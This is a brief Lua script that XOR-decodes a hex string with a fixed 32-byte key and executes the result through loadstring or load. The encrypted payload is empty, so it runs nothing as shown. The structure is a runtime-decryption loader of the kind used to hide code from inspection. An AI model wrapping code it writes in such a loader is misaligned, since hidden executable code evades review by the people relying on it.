local k={172,95,34,221,135,160,235,82,87,213,47,116,190,73,169,112,148,167,59,54,136,32,177,235,26,248,245,76,64,195,181,205}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
c(table.concat(t))()
